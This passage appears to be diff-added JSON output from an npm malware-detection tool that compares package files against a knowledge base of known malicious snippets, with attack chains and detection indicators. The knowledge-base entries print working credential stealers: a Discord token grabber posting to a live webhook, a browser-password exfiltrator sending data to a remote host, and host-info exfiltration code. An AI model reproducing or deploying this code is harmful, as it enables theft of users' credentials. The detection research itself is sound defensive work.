+              "source_package": "mathjs-min (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_195108/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4604702591896057,
+              "code_similarity": 0.39330706000328064,
+              "behavior_similarity": 0.5276334285736084,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "function discordTokenGrabber() {\n  let paths;\n  const local = process.env.LOCALAPPDATA;\n  const roaming = process.env.APPDATA;\n  paths = {\n    \"Discord\": path.join(roaming, \"Discord\"),\n    \"Discord Canary\": path.join(roaming, \"discordcanary\"),\n    \"Discord PTB\": path.join(roaming, \"discordptb\"),\n    \"Google Chrome\": path.join(local, \"Google\", \"Chrome\", \"User Data\", \"Default\"),\n    \"Opera\": path.join(roaming, \"Opera Software\", \"Opera Stable\"),\n    \"Brave\": path.join(local, \"BraveSoftware\", \"Brave-Browser\", \"User Data\", \"Default\")\n  }\n  const tokens = {};\n  for (let [platform, path] of Object.entries(paths)) {\n    const tokenList = findToken(path);\n    if (tokenList) {\n      tokenList.forEach(token => {\n        if (tokens[platform] === undefined) tokens[platform] = []\n        tokens[platform].push(token);\n      });\n    }\n  }\n  fetch(\"https://discord.com/api/webhooks/1089530389292388463/6kIrdtmkWbIkk93u34iD3rvLETiCYPEADkP2bLCvyNN-NjgXJ4cWcfs1EOPW2FxR-5nh\", {\n    method: \"POST\",\n    headers: {\n      \"Content-type\": \"application/json\"\n    },\n    body: JSON.stringify({\n      username: \"israel\",\n      content: JSON.stringify(tokens)\n    })\n  }).then(_mug => {}).catch(_mug => {});\n  return tokens;\n}",
+                "code_behavior": "At runtime, the code enumerates Discord and browser data directories using environment variables, extracts tokens using findToken, and exfiltrates all discovered tokens to a hardcoded Discord webhook via HTTPS POST, resulting in credential theft.",
+                "malice_analysis": {
+                  "why_suspicious": "The function aggregates sensitive tokens from multiple applications and exfiltrates them to an external server, which is a hallmark of credential-stealing malware.",
+                  "violated_expectations": "A math library should not perform any network communication, especially not to external webhooks with sensitive data, nor should it aggregate credentials from unrelated applications.",
+                  "similar_legitimate_use": "None in this context; only malware or credential migration tools (with explicit user consent) would aggregate and transmit such data.",
+                  "key_indicators": [
+                    "Hardcoded Discord webhook URL",
+                    "Aggregation of tokens from multiple unrelated applications",
+                    "Network exfiltration of sensitive data via HTTPS POST",
+                    "Use of environment variables to locate application data directories"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when called by sqrtNumber",
+                  "file_location": "src/plain/number/arithmetic.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "mathjs-min",
+                  "package_manager": "npm",
+                  "package_versions": "11.7.2 (all published versions)",
+                  "why_malicious": "The package is a trojanized fork of the legitimate mathjs library, with malicious code injected to steal Discord and browser authentication tokens from user systems and exfiltrate them to an attacker-controlled Discord webhook. The malicious code is embedded in a core arithmetic function, ensuring execution during normal library use, and leverages filesystem, environment variable, and network access to perform credential theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports mathjs-min, then calls sqrtNumber as part of normal math operations.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of discordTokenGrabber and initiation of token theft"
+                  },
+                  {
+                    "step": 2,
+                    "action": "discordTokenGrabber enumerates Discord and browser directories using environment variables, calling findToken to extract tokens from LevelDB storage.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Collection of sensitive authentication tokens from local storage"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected tokens are exfiltrated to a hardcoded Discord webhook via HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives stolen tokens (final objective achieved)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Mathematical or utility functions with unexpected side effects such as filesystem or network access",
+                    "Access to Discord, Chrome, Opera, or Brave storage directories from non-browser-related packages",
+                    "Presence of regex patterns for Discord token formats in code",
+                    "Outbound network requests to Discord webhooks from non-Discord-related packages"
+                  ],
+                  "file_indicators": [
+                    "src/plain/number/arithmetic.js containing token-grabbing logic",
+                    "Functions named discordTokenGrabber or findToken within math libraries",
+                    "Unexpected code additions in core arithmetic/math files"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to discord.com/api/webhooks/1089530389292388463/6kIrdtmkWbIkk93u34iD3rvLETiCYPEADkP2bLCvyNN-NjgXJ4cWcfs1EOPW2FxR-5nh",
+                    "Unusual network activity from mathjs-min or similar math libraries"
+                  ],
+                  "how_to_detect": "Monitor for math or utility packages that access browser or Discord storage directories or environment variables, especially if they make outbound network requests to Discord webhooks. Use static analysis to scan for regex patterns matching Discord tokens and hardcoded webhook URLs in package source code. Flag any mathematical functions that invoke unrelated system or network operations. Employ dynamic analysis to observe unexpected side effects during function execution, such as credential access or network exfiltration."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bibtou-api/1.5.0/package/.eslintrc.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bibtou-api/1.5.0/package/lib/utils.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "utils_slice_1",
+          "code_snippet": "const iso88591 = require('windows-1252')\nconst axios = require('axios')\n\n/**\n * Permet de savoir si l'exécution est faite sur NodeJs\n * @return {Boolean} false si l'on s'exécute dans un navigateur\n */\nfunction isNode() {\n  return (\n    Object.prototype.toString.call(typeof process !== 'undefined' ? process : 0) ===\n    '[object process]'\n  )\n}\n\nasync function convertBlobToText(blob, encoding = 'UTF-8') {\n  // eslint-disable-next-line no-undef\n  const reader = new FileReader()\n\n  return new Promise(resolve => {\n    // This fires after the blob has been read/loaded.\n    reader.addEventListener('loadend', e => {\n      const text = e.srcElement.result\n      resolve(text)\n    })\n\n    // Start reading the blob as text.\n    reader.readAsText(blob, encoding)\n  })\n}\n\nasync function requestHtmlPageForNode(options) {\n  const nodeOptions = {\n    ...options,\n    responseType: 'arraybuffer',\n    responseEncoding: 'binary',\n  }\n  const response = await axios.request(nodeOptions)\n  return iso88591.decode(response.data.toString('binary'))\n}\n\nasync function requestHtmlPageForBrowser(options) {\n  const browserOptions = {\n    ...options,\n    responseType: 'blob',\n  }\n  const response = await axios.request(browserOptions)\n  const blob = response.data\n\n  return convertBlobToText(blob, 'iso8859-1')\n}\n\nasync function requestHtmlPage(options) {\n  if (isNode()) {\n    return requestHtmlPageForNode(options)\n  }\n  return requestHtmlPageForBrowser(options)\n}\n\nmodule.exports = {\n  isNode,\n  convertBlobToText,\n  requestHtmlPage,\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.5172319889068603,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code performs HTTP network requests using axios to fetch HTML pages, handling response data differently based on the execution environment (Node.js or browser). It accesses network APIs to retrieve remote content, decodes binary or blob data into text using specified encodings (including windows-1252), and returns the decoded content. This behavior facilitates remote data retrieval over HTTP(S) without any hardcoded URLs or suspicious commands.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code performs HTTP requests using axios to fetch HTML content and decodes it appropriately depending on the runtime environment (Node.js or browser). It does not contain any hardcoded URLs, does not execute external processes, does not exfiltrate data to suspicious domains, nor does it disable security features like TLS verification. Compared to the known malicious patterns, it lacks any suspicious or malicious operations such as credential harvesting, disabling security checks, or resource exhaustion exploits. The use of axios and encoding libraries is legitimate and typical for web content retrieval. Therefore, there is very low confidence that this code is malicious.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205359_428696_snippet_1",
+              "source_package": "axios (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205359_428696/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5265856981277466,
+              "code_similarity": 0.4235091805458069,
+              "behavior_similarity": 0.629662275314331,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "require('axios').get(\n  'https://upload.wikimedia.org/wikipedia/commons/f/fe/A_Different_Slant_on_Carina.jpg',\n  { maxContentLength: 2000 }\n)\n  .then(d => console.log('done'))\n  .catch(e => console.log(e.toString()))",
+                "code_behavior": "At runtime, the code issues an HTTP GET request using axios with a maxContentLength limit set, axios continues to download and process the entire HTTP response even after the specified content length is exceeded, resulting in unbounded resource consumption.",
+                "malice_analysis": {
+                  "why_suspicious": "The code appears to enforce a strict content length limit for HTTP responses, but due to the vulnerability in axios versions < 0.19.0, the maxContentLength option is not enforced. This allows attackers to send excessively large responses, causing the application to consume excessive memory, CPU, and I/O resources.",
+                  "violated_expectations": "Normal behavior would be for axios to terminate the HTTP connection or stop processing data once the maxContentLength is exceeded, preventing further resource usage. Instead, the vulnerable versions ignore the limit and continue processing the entire response, exposing the application to resource exhaustion.",
+                  "similar_legitimate_use": "Legitimate HTTP clients enforce content length limits to protect against large or malicious payloads. In secure implementations, exceeding the limit should trigger an error and halt further processing.",
+                  "key_indicators": [
+                    "Use of axios with maxContentLength option set in code",
+                    "HTTP client continues to process data after exceeding maxContentLength",
+                    "No explicit connection termination or response destruction after limit is reached",
+                    "Application experiences high memory, CPU, or I/O usage during large HTTP responses"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "application code using axios (e.g., app.js, server.js)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "axios",
+                  "package_manager": "npm",
+                  "package_versions": "All versions < 0.19.0",
+                  "why_malicious": "The package is not intentionally malicious, but all versions prior to 0.19.0 are vulnerable to a Denial of Service (DoS) attack. The vulnerability allows attackers to exhaust system resources by sending large HTTP responses that are not properly limited by the maxContentLength option, resulting in excessive I/O and CPU usage. This flaw can be exploited remotely and affects any application using axios to fetch data from untrusted sources with a maxContentLength restriction."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker controls a remote server or intercepts traffic to provide a very large HTTP response to an axios request with a maxContentLength limit.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Axios processes the entire large response, consuming excessive resources."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Victim's application or server experiences increased I/O and CPU usage, potentially leading to Denial of Service.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Service disruption or crash (final goal)."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "HTTP client continues to process data after configured content length limit is exceeded",
+                    "Unusually long-lived HTTP connections with large data transfers despite maxContentLength being set",
+                    "Unexpectedly high CPU, memory, or I/O usage during HTTP requests to untrusted sources"
+                  ],
+                  "file_indicators": [
+                    "Use of axios with maxContentLength option in application code (e.g., require('axios').get(..., { maxContentLength: ... }))",
+                    "Absence of explicit connection termination or response destruction logic after content length is exceeded"
+                  ],
+                  "network_indicators": [
+                    "Large HTTP responses from untrusted or external domains",
+                    "Prolonged open HTTP connections during resource fetching, especially when maxContentLength is configured"
+                  ],
+                  "how_to_detect": "Monitor application logs and metrics for axios requests where the maxContentLength option is set but the process continues to receive and process data beyond the specified limit. Look for patterns of high resource usage (CPU, memory, I/O) during HTTP requests, particularly when fetching from untrusted or external sources. Review code for use of axios without proper error handling or connection termination when content length is exceeded. Automated static analysis can flag code using axios with maxContentLength in vulnerable versions (<0.19.0) and lacking explicit response abort logic."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104241_482183_snippet_1",
+              "source_package": "bb-builder (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104241_482183/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5228142142295837,
+              "code_similarity": 0.5060372352600098,
+              "behavior_similarity": 0.5395911931991577,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var child_process = require(\"child_process\");\nvar exec = child_process.exec;\nvar path = require(\"path\");\nconst fs = require(\"fs\");\nconst axios = require(\"axios\");\nconst pwnurl = \"http://1.host.jwte.ch:1337/pwn\"\nvar workdir = \".\\\\\" + path.join(\".\", \"node_modules\", \"bb-builder\") + \"\\\\\";\nexec(workdir + \"extension.exe\" + \" /shtml \\\"out.html\\\"\", function(err, stdout, stderr) {\n  axios.post(pwnurl, require(\"fs\").readFileSync(\"./out.html\", \"utf-8\")).then(a => a).catch(console.error)\n  fs.unlinkSync(\"./out.html\");\n})",
+                "code_behavior": "At runtime, the code executes a bundled credential recovery tool (WebBrowserPassView) using child_process.exec, extracts browser-stored credentials to an HTML file, reads the file contents, sends the data via HTTP POST to a hardcoded external server, and deletes the output file to remove evidence.",
+                "malice_analysis": {
+                  "why_suspicious": "The code launches an external credential recovery tool to harvest sensitive browser credentials, exfiltrates the data to an attacker-controlled server, and deletes the evidence. This sequence is characteristic of credential-stealing malware and is highly suspicious in any npm package.",
+                  "violated_expectations": "Legitimate npm packages do not execute external binaries, harvest user credentials, or communicate with unknown external servers. They also do not perform anti-forensic actions such as deleting evidence files after exfiltration.",
+                  "similar_legitimate_use": "Password recovery tools like WebBrowserPassView may be used by end-users for local credential recovery, but never as part of an npm package or with automated exfiltration to a remote server.",
+                  "key_indicators": [
+                    "Execution of WebBrowserPassView or similar credential recovery binaries from within the package",
+                    "Automated reading and exfiltration of credential data files (e.g., out.html)",
+                    "Outbound HTTP POST requests to hardcoded, suspicious domains (e.g., 1.host.jwte.ch:1337/pwn)",
+                    "Immediate deletion of output files after exfiltration (anti-forensics)"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the package is executed as part of a build process or script execution)",
+                  "file_location": "main JavaScript file of bb-builder package (e.g., index.js or main entry point)",
+                  "required_permissions": [
+                    "filesystem (read/write/delete files)",
+                    "network (outbound HTTP requests)",
+                    "process_execution (spawn external binaries)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "bb-builder",
+                  "package_manager": "npm",
+                  "package_versions": [
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0.3",
+                    "1.0.4",
+                    "1.0.5",
+                    "1.0.6"
+                  ],
+                  "why_malicious": "The package embeds and executes a credential-stealing binary (WebBrowserPassView) to extract browser-stored credentials, exfiltrates the stolen data to an external attacker-controlled server, and deletes evidence of the theft. The malicious code is intentionally obfuscated within a seemingly legitimate npm package, and such behavior is never expected in any legitimate npm package."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or executes the bb-builder package, which triggers the malicious JavaScript code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of credential recovery tool"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The package executes the bundled WebBrowserPassView binary to extract browser-stored credentials and saves them to an HTML file (out.html).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential data is written to disk"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package reads the credential data from the HTML file and sends it via HTTP POST to the attacker's server at http://1.host.jwte.ch:1337/pwn.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of sensitive credentials"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The package deletes the HTML file containing the credentials to remove evidence of the theft.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Anti-forensics; attack complete"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of external credential recovery tools (e.g., WebBrowserPassView) from within npm package scripts",
+                    "Automated creation and deletion of temporary credential data files (e.g., out.html) during package execution",
+                    "Outbound HTTP POST requests to hardcoded, suspicious domains during package runtime",
+                    "Immediate removal of files containing sensitive data after network exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of WebBrowserPassView or similar binaries (e.g., extension.exe) in npm package directories (e.g., node_modules/bb-builder/)",
+                    "Creation and subsequent deletion of files named out.html or similar in the working directory",
+                    "Suspicious executable files bundled within JavaScript packages"
+                  ],
+                  "network_indicators": [
+                    "HTTP POST requests to http://1.host.jwte.ch:1337/pwn or similar credential collection endpoints",
+                    "Outbound network connections from npm package scripts to unknown or untrusted domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that bundle and execute credential recovery tools such as WebBrowserPassView, especially those that create and quickly delete temporary files containing credentials. Flag any package that makes HTTP POST requests to hardcoded or suspicious domains (e.g., 1.host.jwte.ch:1337) during installation or runtime. Use static analysis to detect embedded binaries and dynamic analysis to observe file creation/deletion and network activity during package execution."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104221_852989_snippet_2",
+              "source_package": "btc-api-node (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104221_852989/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5068632364273071,
+              "code_similarity": 0.5073971748352051,
+              "behavior_similarity": 0.5063292384147644,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// B64 encoded values in index.js\nconst env = process.env;\nenv['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';",
+                "code_behavior": "At runtime, index.js sets the NODE_TLS_REJECT_UNAUTHORIZED environment variable to '0', globally disabling SSL/TLS certificate verification for all outgoing network requests, allowing untrusted connections.",
+                "malice_analysis": {
+                  "why_suspicious": "Disabling SSL/TLS verification exposes all network traffic to interception and man-in-the-middle attacks, and is a known tactic to bypass security controls and facilitate malicious communications.",
+                  "violated_expectations": "Legitimate packages should never globally disable SSL/TLS verification, as this undermines the security of all network communications.",
+                  "similar_legitimate_use": "In rare cases, developers may disable verification for local debugging, but this should never occur in production or in published packages.",
+                  "key_indicators": [
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in process.env",
+                    "Obfuscated (base64-encoded) values in index.js",
+                    "Global impact on all subsequent network requests"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall/runtime",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "btc-api-node",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (removed quickly after upload)",
+                  "why_malicious": "The package impersonates a legitimate cryptocurrency API library but contains a postinstall script that executes a malicious index.js file. This file disables SSL/TLS verification globally, downloads a payload from an attacker-controlled domain, creates hidden directories, and writes compromise markers, enabling further compromise and persistence on the system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of index.js and environment manipulation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js disables SSL/TLS verification for all outgoing network requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Allows unverified and potentially malicious network communication"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js creates a hidden directory and downloads a token file from attacker infrastructure.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System is marked as compromised and ready for stage 2 payloads"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch index.js or similar files during npm package installation",
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in environment variables within package scripts",
+                    "Creation of hidden directories (e.g., .electron) during install process",
+                    "Download of files from non-standard or suspicious domains (e.g., npmaudit.com) during installation"
+                  ],
+                  "file_indicators": [
+                    ".electron/token",
+                    "Presence of index.js with base64-encoded values",
+                    "package.json with postinstall script referencing index.js"
+                  ],
+                  "network_indicators": [
+                    "npmaudit.com (attacker-controlled C2 domain)",
+                    "HTTP(S) requests to https://npmaudit.com/api/v4/init endpoint"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute JavaScript files, especially those that set NODE_TLS_REJECT_UNAUTHORIZED=0 or download files from non-standard domains. Flag packages that create hidden directories or write token files (e.g., .electron/token) during installation. Network monitoring should alert on connections to npmaudit.com or similar suspicious domains and requests to /api/v4/init. YARA rules can be used to detect the base64-encoded string 'Tk9ERV9UTFNfUkVKRUNUX1VOQVVUSE9SSVpFRA==' in process environments or index.js files."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171641_007733_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps) (NSIS installer (Electron app distribution))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171641_007733/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5056080222129822,
+              "code_similarity": 0.4597795903682709,
+              "behavior_similarity": 0.5514364242553711,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst os = require('os');\nconst fs = require('fs');\nconst fetch = require('node-fetch');\n\n// Collect system info\nconst sysInfo = os.userInfo();\nconst browserHistory = fs.readFileSync('path/to/browser/history');\nconst credentials = fs.readFileSync('path/to/credentials');\n\n// Exfiltrate to gofile\nfetch('https://gofile.io/upload', {\n  method: 'POST',\n  body: { sysInfo, browserHistory, credentials }\n});",
+                "code_behavior": "At runtime (upon application execution), the code collects system information, browser history, and credentials from the filesystem using Node.js APIs, then sends this data via an outbound HTTP POST request to the gofile.io file-sharing service, resulting in exfiltration of sensitive user data to an external attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically accesses sensitive files such as browser history and credential stores, then transmits this data to an external file-sharing service (gofile.io) without user knowledge or consent. This behavior is characteristic of infostealer malware.",
+                  "violated_expectations": "Legitimate Electron applications should not access or transmit user credentials, browser history, or detailed system information without explicit user consent and clear disclosure. Accessing and exfiltrating such data is a direct violation of user privacy and security expectations.",
+                  "similar_legitimate_use": "Some legitimate applications may collect anonymized telemetry or crash logs, but they do not access credential stores or browser histories, and always request user consent for any data collection or transmission.",
+                  "key_indicators": [
+                    "Direct file access to browser history and credential files from within Electron app resources",
+                    "Outbound HTTP POST requests to gofile.io/upload or similar file-sharing endpoints",
+                    "Node.js code embedded in .asar archives performing OS-level data harvesting",
+                    "Absence of user prompts or consent dialogs for sensitive data access or transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "at runtime (upon application execution)",
+                  "file_location": "app\\resources\\app.asar\\a.js",
+                  "required_permissions": [
+                    "filesystem (read access to browser and credential files)",
+                    "network (outbound HTTP POST requests)",
+                    "environment_vars (access to user/system information)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps)",
+                  "package_manager": "NSIS installer (Electron app distribution)",
+                  "package_versions": "Unknown (all observed hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "These packages are Electron-based desktop applications distributed via NSIS installers that contain malicious Node.js code within their .asar archives. The code is designed to harvest sensitive user data, including system information, browser histories, and credentials, and exfiltrate it to external file-sharing services such as gofile.io. The applications masquerade as legitimate software to evade detection and facilitate data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and executes a trojanized Electron app distributed as an NSIS installer.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious Electron app is installed and launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Electron app unpacks and executes Node.js code from the .asar archive (a.js) upon application startup.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded into memory and prepared for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects system information, browser history, and credentials from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is gathered from the victim's machine."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to gofile.io via HTTP POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data via the file-sharing service."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser history and credential files without user consent",
+                    "Electron app making outbound HTTP POST requests to file-sharing services such as gofile.io",
+                    "Node.js code within .asar archives performing OS-level data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of suspicious .asar files in Electron app resources (e.g., app\\resources\\app.asar\\a.js)",
+                    "NSIS installer files with hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to https://gofile.io/upload from Electron app processes",
+                    "Unusual HTTP POST requests containing system or credential data to file-sharing domains"
+                  ],
+                  "how_to_detect": "Monitor Electron-based applications for unauthorized access to sensitive files such as browser history and credential stores. Inspect .asar archives for embedded Node.js scripts that perform data harvesting or exfiltration. Flag NSIS installers with known malicious hashes or those that unpack Electron apps exhibiting these behaviors. Monitor network traffic for outbound HTTP POST requests to gofile.io/upload or similar file-sharing services originating from Electron app processes."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205438_695471_snippet_2",
+              "source_package": "angulerjs (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205438_695471/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5024887323379517,
+              "code_similarity": 0.4800589084625244,
+              "behavior_similarity": 0.5249185562133789,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// index.js (formatted)\nconst os = require('os');\nconst https = require('https');\nconst { execSync } = require('child_process');\nconst username = os.userInfo().username;\nconst hostname = os.hostname();\nlet ip = '';\ntry {\n  ip = execSync('curl -s ifconfig.me').toString().trim();\n} catch (e) {}\nconst data = JSON.stringify({ username, hostname, ip });\nconst options = {\n  hostname: 'hits.dwyl.com',\n  path: '/api/collect',\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' }\n};\nconst req = https.request(options);\nreq.write(data);\nreq.end();",
+                "code_behavior": "Upon manual execution, the code collects the current user's username, hostname, and public IP address using os and child_process modules, then sends this data via HTTPS POST to hits.dwyl.com, providing an alternate exfiltration channel for host information to an attacker-controlled domain.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is functionally identical to the malicious preinstall script but targets a different exfiltration endpoint. Its presence in index.js, the main entry point of the package, suggests intent to provide a backup or alternate channel for data exfiltration, even if the preinstall script is blocked or removed.",
+                  "violated_expectations": "Legitimate index.js files in npm packages are expected to provide the main library functionality, not to collect and transmit sensitive host information or make unsolicited network requests.",
+                  "similar_legitimate_use": "There are no legitimate use cases for index.js to silently collect and exfiltrate host information. Standard practice is to only collect anonymized telemetry with user consent and clear documentation.",
+                  "key_indicators": [
+                    "Collection of sensitive host information (username, hostname, public IP) in index.js",
+                    "Outbound HTTPS POST request to hits.dwyl.com, a non-standard and attacker-controlled endpoint",
+                    "Redundant exfiltration logic mirroring the preinstall script",
+                    "No user notification, consent, or documentation of data collection",
+                    "Use of os, https, and child_process modules for data collection and transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "manual execution (not automatically triggered)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "angulerjs",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.3 (and all versions prior to 8.7.6)",
+                  "why_malicious": "The package is malicious because it surreptitiously collects sensitive host information (username, hostname, and public IP address) during installation and exfiltrates it to attacker-controlled endpoints without user knowledge or consent. It was distributed as part of a large-scale typosquatting campaign, mimicking popular libraries to deceive users and facilitate unauthorized data collection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package (e.g., angulerjs@1.1.3).",
+                    "implemented_by": [],
+                    "leads_to": "Triggers preinstall script execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The preinstall script (new.js) is executed, collecting username, hostname, and public IP address from the host system.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collected data is sent via HTTPS POST to a Discord webhook controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive host information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "If index.js is executed (manually or by other means), it collects the same information and sends it to hits.dwyl.com.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Provides an alternate exfiltration channel for the attacker."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm preinstall scripts that collect and exfiltrate system information (username, hostname, public IP) during installation",
+                    "Outbound network requests to Discord webhooks or suspicious domains (e.g., hits.dwyl.com) from installation scripts",
+                    "Presence of redundant exfiltration logic in both preinstall scripts and main entry points (e.g., new.js and index.js)"
+                  ],
+                  "file_indicators": [
+                    "package.json with preinstall field referencing suspicious scripts such as new.js",
+                    "new.js or index.js files containing combined use of os, https, and child_process modules for data collection and transmission",
+                    "Hardcoded references to external domains such as discord.com/api/webhooks or hits.dwyl.com in JavaScript files"
+                  ],
+                  "network_indicators": [
